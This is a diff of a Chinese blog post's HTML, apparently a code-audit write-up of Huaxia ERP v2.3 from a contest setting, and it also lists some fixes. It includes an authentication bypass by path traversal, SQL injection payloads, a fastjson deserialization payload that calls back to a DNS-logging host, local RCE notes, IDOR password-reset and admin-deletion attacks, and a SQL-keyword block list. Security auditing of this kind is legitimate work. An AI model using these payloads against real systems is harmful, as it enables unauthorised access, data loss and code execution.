class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; badStrs.length; i++) &#123;</span><br><span class="line">            <span class="comment">//循环检测，判断在请求参数当中是否包含SQL关键字</span></span><br><span class="line">            <span class="keyword">if</span> (str.indexOf(badStrs[i]) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -503,17 +503,17 @@
 <p><strong>来验证第一种情况：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requestUrl中如果存在/doc.html，/register.html，/login.html字段就可以绕过认证请求</span><br></pre></td></tr></table></figure>
 <p>拿我们上面那个SQL注入payload举例子：</p>
-<p><img src="../images/image-20250822224255730.png" alt="image-20250822224255730" /></p>
+<p><img src="/images/image-20250822224255730.png" alt="image-20250822224255730" /></p>
 <p>可见，当我们把cookie删去之后，就会重定向至login.html</p>
 <p>但我们访问</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/login.html/../unit/list?search=%7b%22name%22%3a%22&#x27;%20AND%20SLEEP(5)--%20jsh%22%7d&amp;pageSize=10&amp;currentPage=1</span><br></pre></td></tr></table></figure>
 <p>就能越权访问</p>
-<p><img src="../images/image-20250822224407201.png" alt="image-20250822224407201" /></p>
+<p><img src="/images/image-20250822224407201.png" alt="image-20250822224407201" /></p>
 <p><strong>第二种情况也类似</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传入verify()方法进行判断的时候，正确的使用应该选择endsWith()来判断url是否以.css、.png这些资源后缀结尾，但是上图代码只是使用正则表达式判断.css，.png名字存在即可，导致传入诸如：../a.css/../，也可以绕过认证请求</span><br></pre></td></tr></table></figure>
 <p>访问</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/a.css/../unit/list?search=%7b%22name%22%3a%22&#x27;%20AND%20SLEEP(5)--%20jsh%22%7d&amp;pageSize=10&amp;currentPage=1</span><br></pre></td></tr></table></figure>
-<p><img src="../images/image-20250822224557387.png" alt="image-20250822224557387" /></p>
+<p><img src="/images/image-20250822224557387.png" alt="image-20250822224557387" /></p>
 <p><strong>来看第三种情况</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用startsWith()方法来判断url是否以/user/login，/user/registerUser等字符开头的时候，可以使用目录穿越来骗过判断，导致可以绕过认证请求</span><br></pre></td></tr></table></figure>
 <p>这个跟上面的利用方式一样，使用穿越来绕过，payload可以这样写：/user/login/…/…/，/user/registerUser/…/…/，/v2/api-docs…/…/</p>
@@ -525,10 +525,10 @@
 <h3 id="漏洞验证-3"><a class="markdownIt-Anchor" href="#漏洞验证-3"></a> 漏洞验证</h3>
 <p>在之前审计 <code>Filter</code> 的时候并未发现针对 XSS 进行了些许过滤</p>
 <p>这里进行了一次黑盒测试，成功XSS，且每次访问该订单都会触发XSS</p>
-<p><img src="../images/image-20250822225810933.png" alt="image-20250822225810933" /></p>
+<p><img src="/images/image-20250822225810933.png" alt="image-20250822225810933" /></p>
 <p>其他地方也一样，XSS爆多</p>
-<p><img src="../images/image-20250822230118344.png" alt="image-20250822230118344" /></p>
-<p><img src="../images/image-20250822230229622.png" alt="image-20250822230229622" /></p>
+<p><img src="/images/image-20250822230118344.png" alt="image-20250822230118344" /></p>
+<p><img src="/images/image-20250822230229622.png" alt="image-20250822230229622" /></p>
 <h3 id="漏洞修复-3"><a class="markdownIt-Anchor" href="#漏洞修复-3"></a> 漏洞修复</h3>
 <p>直接添加 Filter</p>
 <p>这是一个 <strong>Servlet Filter</strong>，会拦截所有进入的 HTTP 请求。</p>
@@ -540,62 +540,62 @@
 <h3 id="漏洞验证-4"><a class="markdownIt-Anchor" href="#漏洞验证-4"></a> 漏洞验证</h3>
 <p>还记得之前看到的fastjson依赖，是存在漏洞的</p>
 <p>fastjson的核心在于调用了fastjson.JSON的parseObject函数将json字符串反序列化成对象，搜一下&quot; <code>parseObject(</code> &quot;调用：</p>
-<p><img src="../images/image-20250823140525077.png" alt="image-20250823140525077" /></p>
+<p><img src="/images/image-20250823140525077.png" alt="image-20250823140525077" /></p>
 <p>调用的地方有很多，经过筛查，发现一个StringUtil.java，听名字好像是一类通用Util</p>
-<p><img src="../images/image-20250823140632450.png" alt="image-20250823140632450" /></p>
+<p><img src="/images/image-20250823140632450.png" alt="image-20250823140632450" /></p>
 <p>这里面传入了search，我们回溯查看search是不是可控的</p>
 <p>我们搜索<code>StringUtil.getInfo(</code></p>
 <p>发现了个熟人：</p>
-<p><img src="../images/image-20250823141127248.png" alt="image-20250823141127248" /></p>
-<p><img src="../images/image-20250823141206362.png" alt="image-20250823141206362" /></p>
+<p><img src="/images/image-20250823141127248.png" alt="image-20250823141127248" /></p>
+<p><img src="/images/image-20250823141206362.png" alt="image-20250823141206362" /></p>
 <p>还是这个search</p>
 <p>payload:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;uqrwv2.dnslog.cn&quot;&#125;</span><br></pre></td></tr></table></figure>
 <p>进行编码：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/unit/list?search=%7b%22%40%74%79%70%65%22%3a%22%6a%61%76%61%2e%6e%65%74%2e%49%6e%65%74%34%41%64%64%72%65%73%73%22%2c%22%76%61%6c%22%3a%22%75%71%72%77%76%32%2e%64%6e%73%6c%6f%67%2e%63%6e%22%7d&amp;pageSize=10&amp;currentPage=1</span><br></pre></td></tr></table></figure>
-<p><img src="../images/image-20250823141939796.png" alt="image-20250823141939796" /></p>
-<p><img src="../images/image-20250823141948151.png" alt="image-20250823141948151" /></p>
+<p><img src="/images/image-20250823141939796.png" alt="image-20250823141939796" /></p>
+<p><img src="/images/image-20250823141948151.png" alt="image-20250823141948151" /></p>
 <p>DNS成功解析,证明了存在fastjson反序列化漏洞</p>
 <p>我们可以更进一步进行RCE（本地调试，而不是原来的漏洞）</p>
 <p>这里对 jdk 版本是要低一些，并且要先开启 <code>AutoTypeSupport</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span><br></pre></td></tr></table></figure>
-<p><img src="../images/image-20250823144853295.png" alt="image-20250823144853295" /></p>
+<p><img src="/images/image-20250823144853295.png" alt="image-20250823144853295" /></p>
 <p>然后再进行本地调试</p>
 <p>先开启恶意 <code>.class</code> 和 Ldap</p>
-<p><img src="../images/OpenCalc.png" alt="img" /></p>
+<p><img src="/images/OpenCalc.png" alt="img" /></p>
 <p>弹计算器成功</p>
-<p><img src="../images/SuccessFastjson.png" alt="img" /></p>
+<p><img src="/images/SuccessFastjson.png" alt="img" /></p>
 <p>根据上面查找的结果，search接口全部都存在fastjson反序列化漏洞。</p>
 <p>利用上面的登录权限绕过，可未授权命令执行。</p>
 <h3 id="漏洞修复-4"><a class="markdownIt-Anchor" href="#漏洞修复-4"></a> 漏洞修复</h3>
 <p>一开始我有点不理解，1.2.55是需要开启AutoType才能进行反序列化的吧，但这里也没开，算漏洞吗？</p>
 <p>后面参考大佬博客才知道</p>
 <p>1.2.55 的版本也是存在能够不开启 <code>AutoType</code> 的 PoC 的，而且也不少，所以这里也是存在漏洞的。具体的 PoC 可以参考这个仓库<a target="_blank" rel="noopener" href="https://github.com/safe6Sec/Fastjson">https://github.com/safe6Sec/Fastjson</a></p>
-<p><img src="../images/image-20250823155110340.png" alt="image-20250823155110340" /></p>
+<p><img src="/images/image-20250823155110340.png" alt="image-20250823155110340" /></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">AutoType 为 false 时 :先黑名单过滤，再白名单过滤，若白名单匹配上则直接加载该类，否则报错</span><br><span class="line"></span><br><span class="line">AutoType 为 true 时 :先白名单过滤，匹配成功即可加载该类，否则再黑名单过滤</span><br><span class="line"></span><br><span class="line">要用的 PoC 是 fastjson&lt;=1.2.68 的攻击方法，正好这里也有 hikari 的库，所以这个题目应该是这么打的。</span><br><span class="line"></span><br><span class="line">至于在比赛当中的修复，直接把这个入口类 ban 掉即可。有一些其他接口也是存在 parseObject 的反序列化入口，但是输入并不可控，就没有必要管了。</span><br></pre></td></tr></table></figure>
 <p>参考大佬的FIX</p>
-<p><img src="../images/ban.png" alt="img" /></p>
+<p><img src="/images/ban.png" alt="img" /></p>
 <h2 id="越权密码重置漏洞"><a class="markdownIt-Anchor" href="#越权密码重置漏洞"></a> 越权密码重置漏洞</h2>
 <p>首先创建一个普通用户</p>
-<p><img src="../images/image-20250823151032501.png" alt="image-20250823151032501" /></p>
-<p><img src="../images/image-20250823151159408.png" alt="image-20250823151159408" /></p>
+<p><img src="/images/image-20250823151032501.png" alt="image-20250823151032501" /></p>
+<p><img src="/images/image-20250823151159408.png" alt="image-20250823151159408" /></p>
 <p>点击重置密码就会把用户的密码恢复为初始密码123456</p>
 <p>抓包</p>
-<p><img src="../images/image-20250823151350455.png" alt="image-20250823151350455" /></p>
+<p><img src="/images/image-20250823151350455.png" alt="image-20250823151350455" /></p>
 <p>传入用户id就能重置该用户的密码</p>
 <p>我们来看代码层</p>
-<p><img src="../images/image-20250823151610665.png" alt="image-20250823151610665" /></p>
+<p><img src="/images/image-20250823151610665.png" alt="image-20250823151610665" /></p>
 <p>跟进<code>userService.resetPwd</code></p>
-<p><img src="../images/image-20250823151725059.png" alt="image-20250823151725059" /></p>
+<p><img src="/images/image-20250823151725059.png" alt="image-20250823151725059" /></p>
 <p>这里只是简单判断了 <code>&quot;admin&quot;.equals(loginName)</code></p>
 <p>如果不是 admin，这里就直接进行 <code>user.setPassword()</code> 了，并未将 ID 与 loginName 一一对应。</p>
-<p><img src="../images/image-20250823152919885.png" alt="image-20250823152919885" /></p>
+<p><img src="/images/image-20250823152919885.png" alt="image-20250823152919885" /></p>
 <p>这里我们先将test123的密码改为1</p>
 <p>然后通过132发包重置test123的密码</p>
-<p><img src="../images/image-20250823153604856.png" alt="image-20250823153604856" /></p>
+<p><img src="/images/image-20250823153604856.png" alt="image-20250823153604856" /></p>
 <p>为什么我这里失败了[恼]</p>
 <p>贴别人的图：<br />
-<img src="../images/1622875216268-a6cf93cb-2ac1-4b8f-8c3c-6b0bf95887de.png" alt="image.png" /></p>
+<img src="/images/1622875216268-a6cf93cb-2ac1-4b8f-8c3c-6b0bf95887de.png" alt="image.png" /></p>
 <p>利用上面的登录权限绕过，可未授权重置根据用户id重置用户密码（遍历id重置所有用户密码）。</p>
 <h2 id="越权删除用户"><a class="markdownIt-Anchor" href="#越权删除用户"></a> 越权删除用户</h2>
 <p>这个漏洞的利用和上一个漏洞很像</p>
@@ -603,38 +603,38 @@
 <ul>
 <li>先去看 <code>deleteUser</code> 对应的接口</li>
 </ul>
-<p><img src="../images/deleteUser.png" alt="img" /></p>
+<p><img src="/images/deleteUser.png" alt="img" /></p>
 <p>同样，去看 Service 层的业务代码</p>
-<p><img src="../images/BatDeleteUser.png" alt="img" /></p>
+<p><img src="/images/BatDeleteUser.png" alt="img" /></p>
 <p>这里其实这么写是也有道理的，我们可以发现普通用户是没有管理用户这个界面的，所以对于代码来说，也是情有可原。</p>
 <p>但是问题就出在 <code>doc.html</code> 中，这个接口文档在被未授权读取之后，能够看到所有的 URL，配合之前的未授权可以进行删库的操作，但是可利用性并不大。</p>
 <p>我们先用 admin 的账户抓一个 <code>deleteUser</code> 的包</p>
-<p><img src="../images/deteleUserByID.png" alt="img" /></p>
+<p><img src="/images/deteleUserByID.png" alt="img" /></p>
 <p>再用我们普通用户权限去抓包，替换 Session，替换 ID，成功删除 admin 的账户。这里的水平越权与垂直越权都是存在的。</p>
-<p><img src="../images/deleteAdmin.png" alt="img" /></p>
+<p><img src="/images/deleteAdmin.png" alt="img" /></p>
 <p>再登录，就是用户不存在了</p>
-<p><img src="../images/FailedLogin.png" alt="img" /></p>
+<p><img src="/images/FailedLogin.png" alt="img" /></p>
 <h2 id="越权修改用户信息"><a class="markdownIt-Anchor" href="#越权修改用户信息"></a> 越权修改用户信息</h2>
 <p>在系统管理 - 用户管理处 - 选择一个用户 - 编辑用户信息</p>
-<p><img src="../images/1622880804511-ebe3fe1f-cf4f-40a7-9213-d1268e5447c8.png" alt="image.png" /></p>
+<p><img src="/images/1622880804511-ebe3fe1f-cf4f-40a7-9213-d1268e5447c8.png" alt="image.png" /></p>
 <p>抓取数据包：</p>
-<p><img src="../images/1622880844416-fc1faa8f-152c-4a38-a7fe-a4cbf7a809f4.png" alt="image.png" /></p>
+<p><img src="/images/1622880844416-fc1faa8f-152c-4a38-a7fe-a4cbf7a809f4.png" alt="image.png" /></p>
 <p>对应的接口是 <code>updateUser</code></p>
-<p><img src="../images/updateUserController.png" alt="img" /></p>
+<p><img src="/images/updateUserController.png" alt="img" /></p>
 <p>去到 Service 层，这里有一个 <code>checkUserNameAndLoginName(ue);</code> 的语句，跟进去看一下</p>
-<p><img src="../images/updateUserNoJudge.png" alt="img" /></p>
+<p><img src="/images/updateUserNoJudge.png" alt="img" /></p>
 <p><code>checkUserNameAndLoginName()</code> 做了一个什么业务呢，它进行 <code>UserName</code> 与 <code>loignName</code> 是否为空的判断</p>
 <p>我们先看 <code>loginName</code> 是否为空的判断</p>
-<p><img src="../images/getUserListByloginName.png" alt="img" /></p>
+<p><img src="/images/getUserListByloginName.png" alt="img" /></p>
 <p>再看 <code>userName</code></p>
-<p><img src="../images/getUserListByUserName.png" alt="img" /></p>
+<p><img src="/images/getUserListByUserName.png" alt="img" /></p>
 <blockquote>
 <p>乍一看代码好像没啥问题，这里最大的问题是没有把 <code>loginName</code> 或是 <code>UserName</code> 与 ID 进行一个匹配。</p>
 </blockquote>
 <p>由于用户名和登录名的校验逻辑一样，这里只拿登录名检查来说，首先通过getLoginName()获取id对应的登录名，再通过getUserListByUserNameOrLoginName()方法，将登录名作为参数拼接进sql语句中获取user列表，从列表中取出id与前端传入的id进行比较，相同就可以更新数据。同样没有对当前执行更新用户数据的操作的用户身份做判断，尝试越权利用：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test123用户对应的用户id为131</span><br><span class="line"></span><br><span class="line">joker跟test123是平级账户</span><br></pre></td></tr></table></figure>
-<p><img src="../images/1622882405042-70c5e283-c458-4fbc-b19a-1ec284f30ba2.png" alt="image.png" /></p>
-<p><img src="../images/1622882341922-68530c94-5301-477d-9b6e-96e922dd6efc.png" alt="image.png" /></p>
+<p><img src="/images/1622882405042-70c5e283-c458-4fbc-b19a-1ec284f30ba2.png" alt="image.png" /></p>
+<p><img src="/images/1622882341922-68530c94-5301-477d-9b6e-96e922dd6efc.png" alt="image.png" /></p>
 <p>成功越权修改他人的用户信息</p>
 <p>其实后面还有很多未授权漏洞，这里懒得看了，这也算一个比较简单的CMS审计了</p>
 <h2 id="越权漏洞修复"><a class="markdownIt-Anchor" href="#越权漏洞修复"></a> 越权漏洞修复</h2>
@@ -682,7 +682,7 @@
       
         
         
-          <img data-src="/images/17369576223624.jpg" data-sizes="auto" alt="华夏ERP-CMSv2.3" class="lazyload">
+          <img data-src="/images/17373827994914.jpg" data-sizes="auto" alt="华夏ERP-CMSv2.3" class="lazyload">
         
       
       <a href="/2025/08/22/%E5%8D%8E%E5%A4%8FERP-CMSv2-3/"></a>
@@ -907,7 +907,7 @@
         window.REIMU_POST = {
           author: "FuB0Y",
           title: "[代码审计]华夏ERPv2.3",
-          url: "http://example.com/2025/08/22/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]%E5%8D%8E%E5%A4%8FERP-CMSv2-3/",
+          url: "https://fub0y2026.github.io/2025/08/22/[%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]%E5%8D%8E%E5%A4%8FERP-CMSv2-3/",
           excerpt: "",
           description: "",
           stripContent: " 前言 这个 CMS 被用于了蓝帽杯的比赛当中，看里面挺多漏洞的，就用来挖洞练练手了 现在还是以白盒测试为主，黑盒的话我感觉我也测不出什么东西（知己知彼，百战不殆）  环境搭建 下载源码，创建jsh_erp数据库，导入sql，启动    审计准备  依赖 先看pom.xml   发现了有个fastjson1.2.55,是有漏洞的 还有log4j，但这个版本似乎没有漏洞 数据库使用了MyBatis 其他外部组件也没什么好奇的了  Filter过滤器审计 1234567891011121314151",
